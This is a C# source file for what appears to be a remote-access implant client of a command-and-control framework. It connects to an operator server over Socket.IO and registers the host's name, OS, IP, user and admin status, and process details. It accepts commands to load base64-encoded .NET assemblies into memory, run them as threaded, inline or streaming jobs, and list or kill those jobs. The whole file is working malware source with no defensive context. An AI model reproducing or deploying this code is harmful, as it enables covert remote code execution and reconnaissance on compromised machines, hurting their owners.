using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using SocketIOClient;
using System.Net;
using System.Security.Principal;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text.Json;

namespace CoreClient
{
    public class Job
    {
        public DateTime StartTime;
        public string Module;
        public string Method;
        public int Id;
        public Thread Thread;
        public Queue<Dictionary<string, string>> Queue;
    }
    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                Go(args[0]);
            }
            else
            {
                Go();
            }
            while (true) {
                Thread.Sleep(100);
            };
        }
        static async void Go(string home = "http://localHost:8888")
        {
            // create new socket.io client
            var client = new SocketIO(home);

            // Create the agent id
            string id = Guid.NewGuid().ToString();

            // register all of the commands
            // Client echo
            client.On("echo", response =>
            {
                Console.WriteLine(response.ToString());
                client.EmitAsync("echo", new { returnType = 0, content = response.ToString() });
            });

            // Client ping/pong for testing latency
            client.On("ping", response =>
            {
                client.EmitAsync("pong");
            });

            // Shut down the agent
            client.On("exit", response =>
            {
                Environment.Exit(0);
            });

            // Client load .NET assembly (dll)
            client.On("load", response =>
            {
                try
                {
                    Assembly assembly = Assembly.Load(Convert.FromBase64String(response.GetValue<string>()));
                    client.EmitAsync("echo", "Loaded " + assembly.FullName);
                }
                catch (Exception e)
                {
                    client.EmitAsync("echo", "Load failed!\n\n" + e.Message);
                }
            });

            List<Job> jobs = new List<Job>();
            int jobId = 10;
            // Client invoke loaded assembly (.NET DLL)
            client.On("run-task", response =>
            {
                Thread myNewThread = new Thread(() => RunAndReturn(client, response));
                myNewThread.Start();
                jobs.Add(new Job
                {
                    StartTime = DateTime.Now,
                    Module = response.GetValue<string[]>()[0],
                    Method = "Main",
                    Id = ++jobId,
                    Thread = myNewThread
                });

            });

            client.On("run-stream", response =>
            {
                var newJobId = ++jobId;
                var queue = new Queue<Dictionary<string, string>>();
                Thread myNewThread = new Thread(() => RunStream(client, response, queue, newJobId));
                myNewThread.Start();

                jobs.Add(new Job
                {
                    StartTime = DateTime.Now,
                    Module = response.GetValue<string[]>()[0],
                    Method = "Stream",
                    Id = newJobId,
                    Thread = myNewThread,
                    Queue = queue
                });
            });

            client.On("list-jobs", response =>
            {
                jobs = jobs.Where(j => j.Thread.IsAlive).ToList();

                client.EmitAsync("echo", new
                {
                    returnType = 0,
                    output = jobs.Any() ?
                        String.Join("\n", jobs.Select(j => $"{j.Id}\t{j.Module}\t{j.Method}\t{((int)(DateTime.Now - j.StartTime).TotalSeconds).ToString()}s"))
                        : "No active jobs"
                });
            });

            client.On("add-job-data", response =>
            {
                var dict = JsonSerializer.Deserialize<Dictionary<string, string>>(response.GetValue(0));
                var job_id = Int32.Parse(dict["id"]);
                jobs.First(j => j.Id == job_id).Queue.Enqueue(dict);
            });

            client.On("kill-job", response =>
            {
                try
                {
                    int searchId = Int32.Parse(response.GetValue<string[]>()[0]);

                    var job = jobs.FirstOrDefault(j => j.Id == searchId);

                    if (job != null)
                    {
                        job.Thread.Abort();
                        jobs.Remove(job);
                    }
                    else
                    {
                        client.EmitAsync("echo", new { returnType = 0, output = "Job not found" });
                    }
                }
                catch (FormatException)
                {
                    client.EmitAsync("echo", new { returnType = 0, output = "Job not found" });
                }

            });

            // Client invoke loaded assembly non-threaded
            client.On("run-inline", response =>
            {
                RunAndReturn(client, response);
            });

            // add an event that happens when we first connect
            client.OnConnected += (sender, e) =>
            {
                client.EmitAsync("register", GetSysinfo(id));
            };

            // finally, connect to the server and start the party
            await client.ConnectAsync();
        }
        static void RunAndReturn(SocketIO client, SocketIOResponse response)
        {
            // Wrapper to run "Invoke" in a thread and send data to server
            string[] args = response.GetValue<string[]>();
            string assemblyName = args[0];
            string[] assemblyArgs = args.Skip(1).Take(args.Length).ToArray(); // args[1:]
            int returnType;
            string output;

            // do the thing
            try
            {
                (returnType, output) = Invoke(assemblyName, assemblyArgs);
            }
            catch (Exception e)
            {
                returnType = 0;
                output = "Error executing assembly " + assemblyName + ":\n" + e.ToString();
            }
            client.EmitAsync("echo", new { returnType, output });
        }

        static void RunStream(SocketIO client, SocketIOResponse response, Queue<Dictionary<string, string>> queue, int jobId)
        {
            // Wrapper to run "Invoke" in a thread and send data to server
            string[] args = response.GetValue<string[]>();
            string assemblyName = args[0];
            string[] assemblyArgs = args.Skip(1).Take(args.Length).ToArray(); // args[1:]
            string output = String.Empty;

            // do the thing
            try
            {
                Invoke(assemblyName, assemblyArgs, "Stream", content => client.EmitAsync("echo", content), queue, jobId);
            }
            catch (ThreadAbortException)
            {
                output = "Job aborted";
            }
            catch (Exception e)
            {
                output = "Error executing assembly " + assemblyName + ":\n" + e.ToString();
            }

            client.EmitAsync("echo", new { returnType = 0, output });
        }

        static (int, string) Invoke(string assemblyName, string[] args, string methodName = "Main", Func<object, Task> callback = null, Queue<Dictionary<string, string>> queue = null, int jobId = 0)
        {
            Assembly assembly = AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(a => a.GetName().Name == assemblyName);

            if(assembly == null)
            {
                throw new Exception("Assembly " + assemblyName + " is not loaded into the process");
            }

            Console.WriteLine("Debug: " + assembly.FullName);
            Type[] types = assembly.GetExportedTypes();
            object methodOutput;
            foreach (Type type in types)
            {
                var method = type.GetMethods().FirstOrDefault(m => m.Name == methodName);
                if (method != null)
                {
                    //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
                    TextWriter prevConOut = Console.Out;
                    var sw = new StringWriter();
                    Console.SetOut(sw);


                    object instance = Activator.CreateInstance(type);
                    var inputObjects = (new object[] { args, callback, queue, jobId }).Where(p => p != null);
                    var input = method.GetParameters()
                        .Select(param => inputObjects.FirstOrDefault(o => o.GetType() == param.ParameterType))
                        .ToArray();
                    methodOutput = method.Invoke(instance, input);

                    //Restore output -- Stops redirecting output
                    Console.SetOut(prevConOut);
                    string strOutput = sw.ToString();

                    // Try catch this just in case the assembly we invoke doesn't have an (int) return value
                    // otherwise the program would explode
                    try
                    {
                        methodOutput = (int)methodOutput;
                    }
                    catch
                    {
                        methodOutput = 0;
                    };
                    return ((int)methodOutput, strOutput);
                }
            }
            return (0, null); // No methodOutput or string output
        }
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());

            var ip = host.AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);

            return ip != null ? ip.ToString() : "0.0.0.0";
        }
        private static bool AmIHigh()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static object GetSysinfo(string id)
        {
            string hostname = Environment.MachineName;
            string version = Environment.OSVersion.VersionString;
            string ipaddr = GetLocalIPAddress();
            string elevated = AmIHigh() ? "*" : "";
            string username = elevated + WindowsIdentity.GetCurrent().Name;
            string pid = Process.GetCurrentProcess().Id.ToString();
            string process = Process.GetCurrentProcess().MainModule.FileName;
            string process_arch = RuntimeInformation.ProcessArchitecture.ToString();
            string pwd = Directory.GetCurrentDirectory();

            return new { id, hostname, version, ipaddr, username, pid, process, process_arch, pwd };
        }
    }
}
